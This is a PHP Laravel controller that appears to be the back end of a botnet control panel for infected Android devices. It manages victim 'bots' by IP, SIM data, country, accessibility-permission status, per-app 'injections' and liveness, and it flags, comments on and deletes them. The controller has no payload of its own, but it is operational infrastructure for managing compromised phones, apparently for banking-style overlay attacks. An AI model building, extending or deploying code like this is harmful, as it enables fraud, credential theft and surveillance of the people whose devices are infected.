<?php

namespace App\Http\Controllers\Api\v1\Bot;

use App\Helpers\ApiResponse;
use App\Http\Controllers\Controller;
use App\Http\Resources\Bot\BotCollection;
use App\Http\Resources\Bot\BotResource;
use App\Models\Bot;
use Carbon\Carbon;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Validation\ValidationException;

class BotController extends Controller
{
    /**
     * @throws ValidationException
     */
    public function index(Request $request): JsonResponse
    {
        $this->validate($request, [
            'filters' => 'array',
            'filters.countries' => 'array',
            'filters.injections' => 'array',
            'filters.statuses' => 'array',
            'filters.tags' => 'array',
            'filters.types' => 'array',
            'filters.statuses.*' => 'string|in:online,offline,dead',
            'filters.tags.*' => 'string', // TODO check user tags
            'filters.types.*' => 'string|in:permissionless,blacklisted,favorite',
            'filters.botIds.*' => 'string|exists:bots,id',
            'page' => 'integer',
            'limit' => 'integer',
            'filters.query' => 'string|nullable',
            'noLimit' => 'boolean',
        ]);

        $countries = $request->get('filters')['countries'] ?? [];
        $injections = $request->get('filters')['injections'] ?? [];
        $statuses = $request->get('filters')['statuses'] ?? [];
        $tags = $request->get('filters')['tags'] ?? [];
        $types = $request->get('filters')['types'] ?? [];
        $searchQuery = $request->get('filters')['query'] ?? [];
        $botIds = $request->get('filters')['botIds'] ?? [];

        $bots = Bot::orderBy('created_at', 'desc');

        if (!empty($botIds)) {
            $bots->whereIn("id", $botIds);
        }

        if (!empty($searchQuery)) {
            $bots->where(function ($query) use ($searchQuery) {
                $query->where('id', 'like', "%$searchQuery%")
                    ->orWhere('ip', 'like', "%$searchQuery%")
                    ->orWhere('metadata', 'like', "%$searchQuery%")
                    ->orWhere('sim_data', 'like', "%$searchQuery%");
            });
        }

        if (!in_array('permissionless', $types, true)) {
            $bots->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "true"');
        } else {
            $bots->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "false"');
        }

        if (count($countries)) {
            $bots->whereIn('country_code', $countries);
        }

        if (count($tags)) {
            $bots->whereIn('tag', $tags);
        } else {
            if (count(auth()->user()->tagsNames) && auth()->user()->role !== 'root') {
                $bots->whereIn('tag', auth()->user()->tagsNames);
            }
        }

        if ($types) {
            $bots->where(function ($query) use ($types) {
                foreach ($types as $type) {
                    switch ($type) {
                        case 'favorite':
                            $query->orWhere('is_favorite', true);
                            break;
                        case 'blacklisted':
                            $query->orWhere('is_blacklisted', true);
                            break;
                    }
                }
            });
        }

        if (count($injections)) {
            $bots->leftJoin('bot_injections', 'bot_injections.bot_id', '=', 'bots.id')
                ->select('bots.*', 'bot_injections.application')
                ->whereIn('bot_injections.application', $injections)
                ->groupBy('bots.id');
        }

        $statusesCount = count($statuses);

        if ($statusesCount && $statusesCount !== 3) {
            $bots->where(function ($query) use ($statuses) {
                foreach ($statuses as $status) {
                    switch ($status) {
                        case 'online':
                            $query->orWhereRaw('last_connection >= DATE_SUB(NOW() , INTERVAL 1 MINUTE)');
                            break;
                        case 'offline':
                            $query->orWhereRaw('last_connection >= DATE_SUB(NOW() , INTERVAL 2400 MINUTE)')
                                ->whereRaw('last_connection < DATE_SUB(NOW() , INTERVAL 1 MINUTE)');
                            break;
                        case 'dead':
                            $query->orWhereRaw('last_connection <= DATE_SUB(NOW() , INTERVAL 2400 MINUTE)');
                            break;
                    }
                }
            });
        }

        if ($request->get('noLimit')) {
            $bots = $bots->get()->map(function (Bot $bot) {
                return ['id' => $bot->id];
            });

            return new ApiResponse([
                'payload' => $bots,
                'success' => true,
            ]);
        }

        $bots = $bots->with([
            'logs' => function ($query) {
                $query->groupBy('application')->where('application', '<>', "");
            },
            'userTimestamps' => function ($query) {
                $query->where('user_id', auth()->user()->id ?? 1);
            },
            'botInjections',
            'botInjections.injection',
        ]);

        $bots = $bots->paginate($request->get('per_page', 4));

        if (!in_array('permissionless', $types, true)) {
            auth()->user()?->entitiesTimestamps?->update([
                'bots' => Carbon::now()->toDateTimeString(),
            ]);
        } else {
            auth()->user()?->entitiesTimestamps?->update([
                'permissionless_bots' => Carbon::now()->toDateTimeString(),
            ]);
        }

        return BotCollection::make($bots)->response();
    }

    /**
     * @throws ValidationException
     */
    public function setType(Bot $bot, Request $request): ApiResponse
    {

        $this->validate($request, [
            'type' => 'required|string|in:favorite,blacklisted',
            'value' => 'required|boolean',
        ]);

        switch ($request->get('type')) {
            case 'favorite':
                $bot->is_favorite = $request->get('value');
                break;
            case 'blacklisted':
                $bot->is_blacklisted = $request->get('value');
                break;
            default:
                break;
        }

        $bot->save();

        return ApiResponse::success(BotResource::make($bot));
    }

    /**
     * @throws ValidationException
     */
    public function delete(Request $request): ApiResponse
    {
        $this->validate($request, [
            'botIds' => 'required|array',
            'botIds.*' => 'exists:bots,id',
        ]);

        $isDeleted = Bot::whereIn('id', $request->get('botIds'))->delete();

        if (!$isDeleted) {
            return ApiResponse::error();
        }

        return ApiResponse::success([
            'botIds' => $request->get('botIds'),
        ]);
    }

    public function deleteAllRemovedApp(): ApiResponse
    {
        $bots = Bot::whereRaw('last_connection <= DATE_SUB(NOW() , INTERVAL 2400 MINUTE)');

        if (count(auth()->user()->tagsNames)) {
            $bots->whereIn('tag', auth()->user()->tagsNames);
        } else if (auth()->user()->role !== 'root') {
            $bots->whereIn('tag', []);
        }

        $bots = $bots->get();

        foreach ($bots as $bot) {
            $bot->delete();
        }

        return ApiResponse::success([
            'botIds' => $bots->pluck('id'),
        ]);
    }

    /**
     * @throws ValidationException
     */
    public function editComment(Request $request): ApiResponse
    {
        $this->validate($request, [
            'comment' => 'string|nullable',
            'botIds' => 'array|required',
            'botIds.*' => 'exists:bots,id',
        ]);

        // TODO check user access for editing

        $bots = Bot::whereIn('id', $request->get('botIds'))->get();

        $botsResponse = [];

        foreach ($bots as $bot) {
            $bot->update([
                'comment' => $request->get('comment'),
            ]);

            $botsResponse[] = [
                'id' => $bot->id,
                'comment' => $request->get('comment'),
            ];
        }

        return ApiResponse::success($botsResponse);
    }
}
